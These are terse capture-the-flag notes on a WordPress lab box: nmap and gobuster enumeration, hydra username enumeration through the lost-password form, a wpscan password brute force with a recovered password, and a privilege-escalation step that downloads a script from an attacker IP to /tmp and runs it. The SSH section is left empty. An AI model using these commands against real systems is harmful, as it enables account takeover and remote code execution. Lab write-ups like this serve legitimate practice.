# enum
## nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 85:87:85:bd:f2:c3:1f:8c:92:1e:e1:2b:7c:4c:22:b2 (RSA)
|   256 e4:46:be:5e:c8:b0:14:24:15:7e:b7:77:ed:2e:13:69 (ECDSA)
|_  256 80:68:a3:63:43:39:16:07:64:64:a3:1f:02:91:dd:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.56
|_http-title: Arturo
|_http-generator: WordPress 6.2
|_http-server-header: Apache/2.4.56 (Debian)
```

## gobuster
/wp-admin             (Status: 301) [Size: 315] [--> http://arturo.seela/wp-admin/]
/wp-content           (Status: 301) [Size: 317] [--> http://arturo.seela/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://arturo.seela/wp-includes/]

# foothold
```
hydra -L /usr/share/wordlists/rockyou.txt -p test arturo.seela http-form-post '/wp-login.php?action=lostpassword:user_login=^USER^&wp-submit=Get+New+Password:F=There is no account with that username or email address.'
```
	[80]  [http-post-form] host: arturo.seela   login: misha   password: test
```
wpscan --usernames misha -P /usr/share/wordlists/rockyou.txt --force --password-attack wp-login --url arturo.seela --no-update
```
Password: 
```
tequieromucho
```

## ssh

# privesc
## gtfobin
```
cat user.txt
curl http://10.201.1.201/gtfonow.py -o /tmp/gtfonow.py

python3 /tmp/gtfonow.py

```
